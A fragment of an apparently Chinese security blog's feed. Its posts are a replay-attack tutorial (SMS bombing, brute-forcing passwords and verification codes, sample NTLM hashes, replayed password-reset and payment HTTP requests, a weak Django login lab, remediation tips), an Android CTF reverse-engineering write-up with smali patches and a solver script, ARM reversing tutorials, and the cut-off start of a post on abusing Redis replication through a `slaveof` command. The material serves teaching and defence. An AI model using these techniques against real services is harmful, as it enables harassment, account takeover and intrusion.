    <content type="html"><![CDATA[<h1 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h1><h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h2><p>​        首先简单看一下百度百科对重放攻击的简介：重放攻击(Replay Attacks)又称重播攻击、回放攻击，是指攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程，破坏认证的正确性。重放攻击可以由发起者，也可以由拦截并重发该数据的敌方进行。攻击者利用网络监听或者其他方式盗取认证凭据，之后再把它重新发给认证服务器。</p><h2 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2. 漏洞原理"></a>2. 漏洞原理</h2><p>​        重放攻击的基本原理就是把以前窃听到的数据原封不动地重新发送给接收方。很多时候，网络上传输的数据是加密过的，此时窃听者无法得到数据的准确意义。但如果他知道这些数据的作用，就可以在不知道数据内容的情况下通过再次发送这些数据达到愚弄接收端的目的。</p><h2 id="3-漏洞危害"><a href="#3-漏洞危害" class="headerlink" title="3. 漏洞危害"></a>3. 漏洞危害</h2><p>​        重放攻击本身只是一种行为和方式，并不会直接造成系统的危害，可能在某些系统中，过多和高频次的重复会对系统造成压力。重放攻击的重要点在于重放的是可以造成目的效果的数据包，从而达到修改和多次执行的效果。</p><p>重放攻击主要是针对系统没有效验请求的有效性和时效性，对于多次请求执行，系统将多次响应。在重放攻击利用最多的形式中，短信轰炸算是重放攻击最直接的利用表现。</p><h2 id="4-常见漏洞类型"><a href="#4-常见漏洞类型" class="headerlink" title="4. 常见漏洞类型"></a>4. 常见漏洞类型</h2><h3 id="1-短信轰炸"><a href="#1-短信轰炸" class="headerlink" title="1. 短信轰炸"></a>1. 短信轰炸</h3><p>​        短线轰炸算是重放攻击中最为直接的利用形式，当系统端没有效验请求的时间差或者只在前端做请求限制的时候，可以无限的请求短信来达到短信轰炸的目的。例如，如下APP请求注册时可以使用手机号和验证码注册登录，但是没有限制短信请求次数和时间间隔。</p><p><img src="\2019\08\重放攻击\1566961437755.png" alt="1566961437755"></p><p>多次请求后可以在手机上看到请求到的短信</p><p><img src="\2019\08\重放攻击\1566961575824.png" alt="1566961575824"></p><h3 id="2-暴力破解"><a href="#2-暴力破解" class="headerlink" title="2. 暴力破解"></a>2. 暴力破解</h3><p>​        暴力破解是重放攻击中，典型的非只重放而达到的攻击类型，而是利用重放这个动作来达到暴力破解的目的。当系统端未做请求验证和错误次数限制时，就可以根据字典或者设定的字符串来破解特定的参数。</p><h4 id="a-暴力破解密码"><a href="#a-暴力破解密码" class="headerlink" title="a. 暴力破解密码"></a>a. 暴力破解密码</h4><p>​        当用户登陆时，缺少验证码或者验证码不失效，并且账号没有错误的次数限制。可以通过暴力破解碰撞密码来登录。例如此处，暴力破解原密码来登陆绑定账号。</p><p><img src="\2019\08\重放攻击\1566963013422.png" alt="1566963013422"></p><p>此处验证码只判断是否存在，并不失效，且可以多次尝试绑定账号，例如如下，当返回为1的时候就是密码正确，绑定成功。</p><p><img src="\2019\08\重放攻击\1566963100686.png" alt="1566963100686"></p><h4 id="b-暴力破解验证码"><a href="#b-暴力破解验证码" class="headerlink" title="b. 暴力破解验证码"></a>b. 暴力破解验证码</h4><p>​        当我们申请修改账号密码等操作时，往往需要给手机号或者邮箱发送一个验证码，当需要修改他们或者越权操作的时候并不一定可以通过修改接收手机或邮箱来收到验证码，这时候可以尝试暴力破解验证码。例如：</p><p>对此请求多次重放后发现仍然返回修改密码失败，说明验证码可以多次使用，这种情况下很有可能是验证码在没有正确验证使用时，后台并不会失效。那么我们尝试爆破验证码，如果成功将修改账号密码。</p><p><img src="\2019\08\重放攻击\1566963823305.png" alt="1566963823305"></p><h4 id="c-暴力破解参数"><a href="#c-暴力破解参数" class="headerlink" title="c. 暴力破解参数"></a>c. 暴力破解参数</h4><p>​        此情况大都在尝试越权的时候，还有尝试修改某些不可知但是可预测的参数，例如此篇文章：</p><p><a href="https://www.freebuf.com/articles/web/164510.html" target="_blank" rel="noopener">重置凭证可暴破</a></p><h4 id="d-暴力破解hash密码"><a href="#d-暴力破解hash密码" class="headerlink" title="d. 暴力破解hash密码"></a>d. 暴力破解hash密码</h4><p>​        此种暴力破解类似破解密码，但此种一般不需要考虑某些验证条件，常在获取到主机权限后，利用hash抓取工具获得，例如Windows平台的hash抓取工具：mimikaze， pwdump7等。获取到Windows的NTLM。</p><pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:44f077e27f6fef69e7bd834c7242b040:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</code></pre><p>常见的爆破工具：<a href="http://ophcrack.sourceforge.net/" target="_blank" rel="noopener">Ophrack</a>、<a href="https://www.openwall.com/john/" target="_blank" rel="noopener">John the Ripper</a>、<a href="https://hashcat.net/hashcat/" target="_blank" rel="noopener">hashcat</a></p><p>这种方式都需要提前准备彩虹表，当然kail上也有集成，同时也有默认字典。</p><h3 id="3-重放支付"><a href="#3-重放支付" class="headerlink" title="3. 重放支付"></a>3. 重放支付</h3><p>​        这种情况往往出现在支付订单的时候，支付到最后一个请求包时，系统收到请求就会确定已支付下单。这时候在系统没有做出准确效验的时候就会根据是否支付成功的验证字段来确定下单，多次重放的时候，系统会根据暂无失效且正常的请求下单。来达到使用同一请求多次获取成功的订单。</p><p>​        但这种情况，现在已经很少会遇到，上一次遇到还要追溯到去年初了。</p><h3 id="4-重放修改密码"><a href="#4-重放修改密码" class="headerlink" title="4. 重放修改密码"></a>4. 重放修改密码</h3><p>​        在很多时候，我们修改密码等操作的时候，是分几步完成的，例如先验证手机验证码，跳转在修改密码。如果在最后确认修改的时候抓包多次重放，可以达到免验证来达到修改密码的作用。也就是这里并没有强制效验手机号和验证码。也就存在了任意修改密码的可能，当然要是效验了手机号和验证码的对应关系，也许就不可以了。</p><pre><code>POST /userpwd?p=1 HTTP/1.1Host: xxx.comphone=13111111111&amp;code=123456</code></pre><p>当我们如上的去请求验证码效验的时候，如果通过会跳往第二个页面修改密码</p><pre><code>POST /userpwd?p=2 HTTP/1.1Host: xxx.comphone=13111111111&amp;pwd=123456&amp;newpwd=123456</code></pre><p>当只是简单的重置的时候，先不谈越权问题，这个包都可能造成多次修改多次重置密码。而并不用验证。</p><pre><code>POST /userpwd?p=2 HTTP/1.1Host: xxx.comphone=13111111111&amp;code=123456&amp;pwd=123456&amp;newpwd=123456</code></pre><p>在修改密码的时候遇到也携带了其他的参数，例如之前的短信验证字段，那么就不一定会造成越权，但可能会有多次重放修改密码的可能。这时候如果需要修改他人密码，就需要爆破验证码来达到效果。这就回到了暴力破解中的验证码爆破。</p><pre><code>POST /userpwd HTTP/1.1Host: xxx.comemail=qq@qq.com&amp;code=123456</code></pre><p>有些系统在重置密码的时候并不是需要各种验证，而是你申请修改就会给你发送重置的密码到你的注册邮箱。例如如上数据包，当验证存在邮箱的时候，只需要输入图片验证码就会发送已经被重置的新密码到指定邮箱。这时候虽然我们不能获取密码，但是缺少验证的方式可导致其他账号密码被重复修改，而影响他人的登陆。真可谓损人不利己的好用处。233333</p><h3 id="5-条件竞争"><a href="#5-条件竞争" class="headerlink" title="5. 条件竞争"></a>5. 条件竞争</h3><p>条件竞争是后台对共享数据读写的时候，多线程没有对共享数据执行线程锁，导致在多个线程获取到的值并不是当前线程操作的实时值，典型的例子是，一份钱买多份。</p><p>例如去年护网杯的Itshop，此处给出WP以便参考：<a href="https://www.codercto.com/a/31463.html" target="_blank" rel="noopener">https://www.codercto.com/a/31463.html</a></p><h2 id="5-漏洞靶场"><a href="#5-漏洞靶场" class="headerlink" title="5. 漏洞靶场"></a>5. 漏洞靶场</h2><p>漏洞环境：Django2.2、python3</p><p>此处利用的是之前写的一个bug平台，当验证会提示如下时，可以根据提示的不同来判断密码是否正确，当密码正确的时候就会跳转到内部页面。</p><pre><code>def login(request):    if request.method == &#39;POST&#39;:        login_form = forms.UserForm(request.POST)        message = &#39;请检查填写的内容！&#39;        if login_form.is_valid():            username = login_form.cleaned_data.get(&#39;username&#39;)            password = login_form.cleaned_data.get(&#39;password&#39;)            try:                user = models.User.objects.get(name=username)            except :                message = &#39;用户不存在！&#39;                return render(request, &#39;login/login.html&#39;, locals())            if user.password == password:                request.session[&#39;is_login&#39;] = True                request.session[&#39;user_id&#39;] = user.id                request.session[&#39;user_name&#39;] = user.name                return redirect(&#39;/index/&#39;)            else:                message = &#39;密码不正确！&#39;                return render(request, &#39;login/login.html&#39;, locals())        else:            return render(request, &#39;login/login.html&#39;, locals())    login_form = forms.UserForm()    return render(request, &#39;login/login.html&#39;, locals())</code></pre><p><img src="\2019\08\重放攻击\1566973835279.png" alt="1566973835279"></p><p>抓包登陆，在没有验证码，且csrf_token在没有起到唯一性的时候，可以通过爆破密码登陆。</p><p><img src="\2019\08\重放攻击\1566974303157.png" alt="1566974303157"></p><p>把数据包丢到Intruder中，多次爆破后发现当密码正确的时候会产生302的跳转。</p><p><img src="\2019\08\重放攻击\1566974456178.png" alt="1566974456178"></p><p>漏洞修复：添加验证码，虽然此处可以添加框架自带的验证码，但建议使用请求式验证码。如不能使用验证码也可以给账号登陆错误次数做一次限制。</p><h2 id="6-漏洞测试工具"><a href="#6-漏洞测试工具" class="headerlink" title="6. 漏洞测试工具"></a>6. 漏洞测试工具</h2><p>重复攻击一般采用可以抓包的工具都可以重复，例如：Charles、burp等。此处较为常用burp。因为在payload上，处理较为灵活，当然如果需要的只是重放，Charles应该不会让你失望。</p><p>burp: <a href="https://portswigger.net/burp" target="_blank" rel="noopener">https://portswigger.net/burp</a></p><p><img src="\2019\08\重放攻击\1566975371357.png" alt="1566975371357"></p><p>Charles：<a href="https://www.charlesproxy.com/" target="_blank" rel="noopener">https://www.charlesproxy.com/</a></p><p><img src="\2019\08\重放攻击\1566975429924.png" alt="1566975429924"></p><h2 id="7-漏洞修改"><a href="#7-漏洞修改" class="headerlink" title="7. 漏洞修改"></a>7. 漏洞修改</h2><ol><li>添加图片验证码，为了应对偏爆破类的重放攻击，添加验证字段是最简单有效的手段。当然你要保证验证是在一次使用后及时失效。</li><li>限制请求次数，有些地方并不适用于添加验证码，或者不能添加验证码。这时候针对同一账户的错误次数限制就显得很有必要。例如，当错误次数连续达到五次的时候，暂时十分钟内不能登陆。</li><li>效验验证码和用户身份，某些重放攻击是利用了手机号和验证码之间的不对应性，特别是在修改密码等处，这时候需要把验证码和请求的用户手机号做联系，当重放或者越权的时候根据验证码次数和对应关系来判断是否允许修改。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;重放攻击&quot;&gt;&lt;a href=&quot;#重放攻击&quot; class=&quot;headerlink&quot; title=&quot;重放攻击&quot;&gt;&lt;/a&gt;重放攻击&lt;/h1&gt;&lt;h2 id=&quot;1-漏洞简介&quot;&gt;&lt;a href=&quot;#1-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>2018 SWPUCTF</title>
    <link href="/2019/08/2018-SWPUCTF/"/>
    <id>/2019/08/2018-SWPUCTF/</id>
    <published>2019-08-26T09:54:14.000Z</published>
    <updated>2019-08-26T09:55:50.708Z</updated>
    
    <content type="html"><![CDATA[<p>某日在GitHub中看到了一些CTF使用的安卓逆向分析题，其中一个是SWPUCTF，是个没怎么听过的CTF。虽然我不怎么了解CTF。23333</p><p>于是，抽时间分析看看是否可以做出来。两个APK。</p><h3 id="app-debug1-apk"><a href="#app-debug1-apk" class="headerlink" title="app-debug1.apk"></a>app-debug1.apk</h3><p>把apk丢到AK中，反编译，结果中有一个目录是assert/timg_2.zip。讲道理，第一反应看到这个，肯定是多多少少有点关系的，本以为是做了代码抽取，动态加载。</p><p><img src="\2019\08\2018-SWPUCTF\1566788175183.png" alt="1566788175183"></p><p>但是这并不是一个zip包，使用010editor查看，发现真不是一个zip包，而是一个完整的jpg格式文件。</p><p><img src="\2019\08\2018-SWPUCTF\1566788301451.png" alt="1566788301451"></p><p>而在文件nextcontent.class中也发现了这个所谓的zip包被当作jpg来读取。</p><p><img src="\2019\08\2018-SWPUCTF\1566788437235.png" alt="1566788437235"></p><p>直接修改为jpg格式图片，打开。</p><p><img src="\2019\08\2018-SWPUCTF\1566788351717.png" alt="1566788351717"></p><p>嗯。。。。这就。。。肯定是姿势不对，换一种方式。</p><p>既然此处是纯JAVA层文件，是对输入的密码的效验，那么采用调试的方式来做。</p><p>此处采用jeb调试，其中，对密码效验的关键方法为check。</p><p>方法开始先判断长度是否为12位，然后判断是否长度为0。</p><p>先修改check下：</p><pre><code>00000000  const/16            v5, 1200000004  const/4             v2, 000000006  invoke-virtual      String-&gt;toCharArray()[C, p10000000C  move-result-object  v10000000E  array-length        v3, v100000010  if-eq               v3, v5, :16  #if-ne  或者添加const/16  v3, 0xc</code></pre><p>在修改mainactivity类中onclick方法下的</p><pre><code>0000001E  new-instance        v0, Check00000022  invoke-direct       Check-&gt;&lt;init&gt;()V, v000000028  invoke-virtual      Check-&gt;checkPassword(String)Z, v0, v20000002E  move-result         v300000030  if-eqz              v3, :72  #修改为if-nez</code></pre><p>重编译安装，输入任意值跳到第二部分，此时显示图片，但是图片上并没有相应的字符串。</p><p>继续调试第二部分。调试的时候发现jeb仍然是不好用，于是改用Androidstudio。在mainactivity2$1.smail文件中找到了读取第二个输入并且做对比的地方。</p><pre><code>.method public onClick(Landroid/view/View;)V    .locals 3    .param p1, &quot;v&quot;    # Landroid/view/View;    .prologue    .line 29    iget-object v2, p0, Lcom/example/test/ctf02/MainActivity2$1;-&gt;this$0:Lcom/example/test/ctf02/MainActivity2;    iget-object v2, v2, Lcom/example/test/ctf02/MainActivity2;-&gt;editText:Landroid/widget/EditText;    invoke-virtual {v2}, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable;    move-result-object v2    const-string v2, &quot;android.is.very.fun&quot;  #增加    invoke-virtual {v2}, Ljava/lang/Object;-&gt;toString()Ljava/lang/String;    move-result-object v1    .line 30    .local v1, &quot;str&quot;:Ljava/lang/String;    new-instance v0, Landroid/content/Intent;    invoke-direct {v0, v1}, Landroid/content/Intent;-&gt;&lt;init&gt;(Ljava/lang/String;)V    .line 31    .local v0, &quot;intent&quot;:Landroid/content/Intent;    iget-object v2, p0, Lcom/example/test/ctf02/MainActivity2$1;-&gt;this$0:Lcom/example/test/ctf02/MainActivity2;    invoke-virtual {v2, v0}, Lcom/example/test/ctf02/MainActivity2;-&gt;sendBroadcast(Landroid/content/Intent;)V    .line 32    return-void.end method</code></pre><p>获取了Broadcast组件，在mainfast.xml文件中有关于这个组件的定义，于是在上把v2修改为组件名字符串。</p><p>重编译安装，第一个输入只需要随便输入几个不重复的字母，跳到第二个输入，只需要点击确认，就会弹出写有flag的图片。</p><p><img src="\2019\08\2018-SWPUCTF\1566800681246.png" alt="1566800681246"></p><h3 id="app-debug2-apk"><a href="#app-debug2-apk" class="headerlink" title="app-debug2.apk"></a>app-debug2.apk</h3><p>同样，丢到AK中反编译，反编译内容如下，其中包含JNI.smail文件，所以大概率是分析so文件。</p><p><img src="\2019\08\2018-SWPUCTF\1566801125774.png" alt="1566801125774"></p><p>在MainActivity$1.smali中看到了jni的调用getResult方法。</p><pre><code>.method public onClick(Landroid/view/View;)V    .locals 3    .param p1, &quot;v&quot;    # Landroid/view/View;    .prologue    .line 24    iget-object v2, p0, Lcom/example/test/ctf03/MainActivity$1;-&gt;this$0:Lcom/example/test/ctf03/MainActivity;    iget-object v2, v2, Lcom/example/test/ctf03/MainActivity;-&gt;pwd:Landroid/widget/EditText;    invoke-virtual {v2}, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable;    move-result-object v2    invoke-virtual {v2}, Ljava/lang/Object;-&gt;toString()Ljava/lang/String;    move-result-object v1    .line 25    .local v1, &quot;str&quot;:Ljava/lang/String;    invoke-static {v1}, Lcom/example/test/ctf03/JNI;-&gt;getResult(Ljava/lang/String;)I    move-result v0    .line 26    .local v0, &quot;result&quot;:I    iget-object v2, p0, Lcom/example/test/ctf03/MainActivity$1;-&gt;this$0:Lcom/example/test/ctf03/MainActivity;    invoke-virtual {v2, v0}, Lcom/example/test/ctf03/MainActivity;-&gt;Show(I)V    .line 27    return-void.end method</code></pre><p>使用IDA打开lib目录下的libNative.so文件。</p><p>在Exports中找到对应的方法，在F5一下查看伪代码</p><p><img src="\2019\08\2018-SWPUCTF\1566801664205.png" alt="1566801664205"></p><p><img src="\2019\08\2018-SWPUCTF\1566804309855.png" alt="1566804309855"></p><p>此处先判断是否是长度为15位，然后用malloc申请三个长度为一字节的变量来初始化。至于Init函数是做什么用的。在如下处，点击进入，看到其中又调用了Init函数，再点击进入。</p><pre><code>.text:000011B0                 MOV             R3, R8  ; char *.text:000011B2                 BLX             j__Z4InitPcS_S_PKci</code></pre><p>在如下地址处：</p><p><img src="\2019\08\2018-SWPUCTF\1566804524606.png" alt="1566804524606"></p><p>不过，并没看懂这是啥意思。。。。先继续往下看。</p><p>后面使用了First函数进行处理，如下处。</p><pre><code>.text:000011B6                 MOV             R0, R6  ; char *.text:000011B8                 BLX             j__Z5FirstPc ; First(char *).text:000011BC                 CBZ             R0, loc_11DA</code></pre><p>点击到函数内找到First函数，查看F5</p><pre><code>signed int __fastcall First(char *a1){  int v1; // r1@1  int v2; // r0@3  signed int v3; // r1@3  v1 = 0;  do  {    a1[v1] = 2 * a1[v1] ^ 0x80;    ++v1;  }  while ( v1 != 4 );  v2 = strcmp(a1, &quot;LN^dl&quot;);  v3 = 0;  if ( !v2 )    v3 = 1;  return v3;}</code></pre><p>把传进来的字符串进行按位乘2和0x80异或，如果等于LN^dl，返回v3为1，不等于则返回v3为0。那么此处需要v3等不等于0呢，查看主要函数的下一步判断是if非，跳转到LABEL_14处，那么需要v3不为0，也就是a1等于LN^dl。同样代表了传入的字符串要乘2异或0x80后等于LN^dl。</p><p><img src="\2019\08\2018-SWPUCTF\1566805704718.png" alt="1566805704718"></p><p>其中需要v4跟一个字符串对于，字符串为以下</p><pre><code>0x20, 0x35, 0x2D, 0x16, 0x61</code></pre><p><img src="\2019\08\2018-SWPUCTF\1566807615894.png" alt="1566807615894"></p><p>整体的逻辑就是先分成三个字符串，然后判断第一个异或处理后是否为LN^dl，是的话对下一个字符串异或，对比相等，继续处理最后一个字符串，等于AFBo}则返回需要的1。那么就剩下一个Init不确定意义，根据分配的大小和函数的内容，猜测应该是把15位的字符串，每一位分配给三个字符串组，毕竟Init中有一个循环操作，且标志增加。也就是</p><pre><code>123456分配两组：135  246</code></pre><p>尝试写脚本反向异或出原字符串。</p><pre><code>str1 = &quot;LN^dl&quot;   #v3str2 = [0x20, 0x35, 0x2D, 0x16, 0x61]   #v4str3 = &quot;AFBo}&quot;   #v5flagstr1 = &#39;&#39;flagstr2 = &#39;&#39;flagstr3 = &#39;&#39;i = 0while i&lt;=4:    flagstr =  str2[i] ^ ord(str3[i])    flagstr3 = flagstr3 + chr(flagstr)    i+=1print(flagstr3)   #原字符串后部分i= 0while i&lt;=4:    flagstr =  ord(str1[i]) ^ str2[i]     flagstr2 = flagstr2 + chr(flagstr)    i+=1print(flagstr2)   #原字符串中间部分i=0while i&lt;=4:    flagstr = (ord(str1[i])^ 0x80 ) // 2    flagstr1 = flagstr1 + chr(flagstr)     i+=1print(flagstr1)    #原字符串开始部分flagstr = &#39;&#39;for x in range(len(str1)):    flagstr4 = flagstr1[x]+flagstr2[x]+flagstr3[x]    flagstr = flagstr + flagstr4print(flagstr)</code></pre><p>但是结果很怪，肯定是后面出了问题，但是理论上异或处理是错的，不该只出现在最后一位上，后面找了<a href="https://www.anquanke.com/post/id/168338#h3-20" target="_blank" rel="noopener">官方的WP</a>，看了别人的Java版poc，感觉也一样。莫非是一些编码和语言上处理的差别？暂时没处理掉此问题。</p><p><img src="\2019\08\2018-SWPUCTF\1566812912519.png" alt="1566812912519"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;某日在GitHub中看到了一些CTF使用的安卓逆向分析题，其中一个是SWPUCTF，是个没怎么听过的CTF。虽然我不怎么了解CTF。23333&lt;/p&gt;
&lt;p&gt;于是，抽时间分析看看是否可以做出来。两个APK。&lt;/p&gt;
&lt;h3 id=&quot;app-debug1-apk&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>结构体链表逆向</title>
    <link href="/2019/07/%E7%BB%93%E6%9E%84%E4%BD%93%E9%93%BE%E8%A1%A8%E9%80%86%E5%90%91/"/>
    <id>/2019/07/结构体链表逆向/</id>
    <published>2019-07-26T09:23:50.000Z</published>
    <updated>2019-07-26T09:56:41.098Z</updated>
    
    <content type="html"><![CDATA[<h3 id="结构体链表逆向"><a href="#结构体链表逆向" class="headerlink" title="结构体链表逆向"></a>结构体链表逆向</h3><p>同样使用如下的C代码：</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct _student{    char name[32];    int age;    struct _student * next;}T_student;T_student * head = NULL;void Insert(const char *name,int age){    T_student * newnode;    newnode = (T_student *)malloc(sizeof(T_student));    newnode-&gt;age = age;    newnode-&gt;next = head;    strcpy(newnode-&gt;name,name);    head = newnode;}void PrintStudent(){    T_student * tmp;    tmp = head;    while(tmp)    {        printf(&quot;name:%s age:%d\n&quot;,tmp-&gt;name,tmp-&gt;age);        tmp=tmp-&gt;next;    }}int  main(){    Insert(&quot;Panda&quot;,15);    Insert(&quot;Dog&quot;,3);    Insert(&quot;Cat&quot;,2);    Insert(&quot;XiaoMing&quot;,20);    PrintStudent();}</code></pre><p>按照惯例，编译把文件丢到IDA，找到main函数，点开。可以看到调用了四次insert函数和PrintStudent函数。</p><p><img src="\2019\07\结构体链表逆向\1564122124023.png" alt="1564122124023"></p><p>点到insert函数中查看函数实现。传入两个参数后，后面调用了malloc函数来分配内存空间，R3就可以看做是malloc分配来的内存并且指向此块内存的指针。其后使用dest来表示这个指针。var_14把内存数据存入dest加偏移量为32的地址上。也就是把第二个int参数存入相应地址。获取head变量，LDR把head变量当作地址来加载其上的数据，head同样可能是指针。而后会把第一个参数和head指针数据同样存入到结构体对应的地址上。只是第一个参数使用了strcpy来复制，顺便一提可能会产生数据覆盖。最后指针dest存到head的地址上，由head来表示基地址。</p><p><img src="\2019\07\结构体链表逆向\1564123321051.png" alt="1564123321051"></p><p>后面再看一下PrintStudent函数。将head的地址值存到新的指针中。以下仍然使用*head表示存入的地址上的数据。判断值为指针是否为0，从而进行遍历，到此为止基本可以看到前面的结构体存入参数和head赋值，完成了一个链表的结构。此处是遍历链表判断是否遍历完成。</p><p>获取到第一个第二个参数后，var_8指针由参数三来进行下一个结构体的查询。</p><p><img src="\2019\07\结构体链表逆向\1564130434725.png" alt="1564130434725"></p><p>实现大致如下，当执行第一次insert函数时，写入一个结构体，并且把结构体的基地址写入head指针，第二次执行insert函数时，把head指针写入第二个结构体的第三个参数也就是结构体的指向下一个节点的指针。完成一个链表的创建。按照执行顺序，从后往前执行，第三个参数也就是节点的指针是前一个结构体的基地址。直到遍历完成，指针为null。</p><p><img src="\2019\07\结构体链表逆向\1564132058549.png" alt="1564132058549"></p><p>至此，结构体链表的分析就算完成了。无名侠的这个课程也算是结束了，不得不说多看几遍还是有不少的收获。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;结构体链表逆向&quot;&gt;&lt;a href=&quot;#结构体链表逆向&quot; class=&quot;headerlink&quot; title=&quot;结构体链表逆向&quot;&gt;&lt;/a&gt;结构体链表逆向&lt;/h3&gt;&lt;p&gt;同样使用如下的C代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>ARM数组重定向</title>
    <link href="/2019/07/ARM%E6%95%B0%E7%BB%84%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    <id>/2019/07/ARM数组重定向/</id>
    <published>2019-07-26T09:23:36.000Z</published>
    <updated>2019-07-26T09:56:13.330Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ARM数组重定向"><a href="#ARM数组重定向" class="headerlink" title="ARM数组重定向"></a>ARM数组重定向</h3><p>使用如下的C代码做演示，代码是无名侠的一份数组演示代码。如下：</p><pre><code>#include &lt;stdio.h&gt;// Arraysint g_Table[100];int g_Table2[100];void PrintAddr(){    printf(&quot;g_Table:0x%x\ng_Table2:%x\n&quot;,g_Table,g_Table2);}void InitTable(){    int i;    for(i=0;i&lt;100;i++)        g_Table[i] = i;    printf(&quot;Table1 init ok\n&quot;);    for(i=0;i&lt;100;i++)        g_Table2[i] = i;}int search(int key){    int i=0;    for(;i&lt;100;i++)    {        if(g_Table[i]==key)            return i;    }    return -1;}int read(int x){    return g_Table[x];}void write(int x,int value){     g_Table[x] = value;}int main(){    int idx;    PrintAddr();    InitTable();    write(2,200);    write(6,900);    if((idx = search(200))!=-1)        write(idx,400);}</code></pre><p>利用之前的makefile文件进行编译，打可执行文件丢入IDA中打开。选择main函数，大概就是酱紫</p><p><img src="\2019\07\ARM数组重定向\1563864556080.png" alt="1563864556080"></p><p>选择第一个函数PrintAddr来查看其中的实现代码。根据其中的注释就可以看出来输出是的打印g_Table和g_Table2。</p><p><img src="\2019\07\ARM数组重定向\1563865049285.png" alt="1563865049285"></p><p>而对于其中的这两个参数只有类似如下数组地址值，所以打印就是数组的地址。</p><pre><code>.text:00000400                 LDR     R2, =(g_Table_ptr - 0x1FE4).text:00000404                 LDR     R2, [R3,R2] ; g_Table</code></pre><p>回到main函数中，重新选择InitTable函数，在图表视图中可以看到此函数实现了两个循环，具体是哪种循环暂不得知，首先查看第一个循环，从开始的循环赋值和比较开始，</p><p><img src="\2019\07\ARM数组重定向\1563866904258.png" alt="1563866904258"></p><p>在左侧的循环体中，获取的是循环变量的值，在STR指令中，把循环变量存入到了R3(g_Table数组的地址值)，R2、*4代表了int型的四字节长度，所以此处意义是array[i] = i。按照循环变量的增长值按顺序存入到了数组中。</p><p>当循环变量大于99时，跳出循环走到右边的步骤，获取R3的地址值，R3则代表的是一串字符串，其后使用puts输出，利用puts是输出后，会自动在其后添加换行符。然后再对循环体重赋值。</p><p>继续查看第二个循环体，由于跟第一个循环一致，不在细看。</p><p><img src="\2019\07\ARM数组重定向\1563868287872.png" alt="1563868287872"></p><p>分析完InitTable函数后，可以得知，这是一个对全局数组进行赋值的操作。也许后面会用到这个数组。回到main函数中，其后调用了两次write函数，对每个write函数进行两个参数的引用。查看write函数。</p><p><img src="\2019\07\ARM数组重定向\1563868846505.png" alt="1563868846505"></p><p>函数跟InitTable其中对数组的操作类似，都是根据参数进入数组的赋值，如下的对write函数中的第一个参数作为数组的下标，以第二个参数作为需要重新赋值的数组值。array[var_8] = var_c。</p><p><img src="\2019\07\ARM数组重定向\1563870802372.png" alt="1563870802372"></p><p>在去选择search函数，查看函数实现和逻辑，其中传入参数var_10为200，进入循环判断是否大于99，进入循环体，获取数组的下标对应的值，来和传入的参数进行对比不相同则跳转继续循环。相同则跳出循环，获取数组下标值返回，类似如下</p><pre><code>R1 = array[var_8] = array[i]R3 = var_10 = 200if array[var_8] == var_10:    return var_8</code></pre><p><img src="\2019\07\ARM数组重定向\1563874211104.png" alt="1563874211104"></p><p>最后的main函数，重新调用了write函数，利用search的返回值来判断是否是-1，CMN是做负数对比。而R3的负数来源search函数的大于99后仍然没有找到返回值时，返回-1。</p><p><img src="\2019\07\ARM数组重定向\1563875783761.png" alt="1563875783761"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ARM数组重定向&quot;&gt;&lt;a href=&quot;#ARM数组重定向&quot; class=&quot;headerlink&quot; title=&quot;ARM数组重定向&quot;&gt;&lt;/a&gt;ARM数组重定向&lt;/h3&gt;&lt;p&gt;使用如下的C代码做演示，代码是无名侠的一份数组演示代码。如下：&lt;/p&gt;
&lt;pre&gt;&lt;code
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Redis 主从复制</title>
    <link href="/2019/07/Redis-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"/>
    <id>/2019/07/Redis-主从复制/</id>
    <published>2019-07-15T02:16:27.000Z</published>
    <updated>2019-07-15T02:37:01.336Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h3><p>redis主从复制，前几天分享的新版redis未授权利用的新型方式。</p><p>什么是主从复制，<a href="http://blog.itpub.net/31545684/viewspace-2213629/" target="_blank" rel="noopener">http://blog.itpub.net/31545684/viewspace-2213629/</a></p><p>通过redis命令来设置主从机</p><pre><code>127.0.0.1:6379&gt; slaveof 192.168.253.131 6379</code></pre><p>被设置的主机将通过SYNC来和主机通信， 通过日志可以看到请求的sync连接。</p><p>首先需要一个高版本的redis服务，<a href="https://redis.io/download。下载后按照官网给的安装步骤来安装。" target="_blank" rel="noopener">https://redis.io/download。下载后按照官网给的安装步骤来安装。</a></p><p>安装后修改redis.conf文件来执行redis，修改文件中的绑定本地地址的参数项，开启任意地址访问。</p><p><img src="\2019\07\Redis-主从复制\1563024704044.png" alt="1563024704044"></p><p>执行命令：<code>src/redis-server ./redis.conf</code>，开启redis成功。</p><p><img src="\2019\07\Redis-主从复制\1563023912222.png" 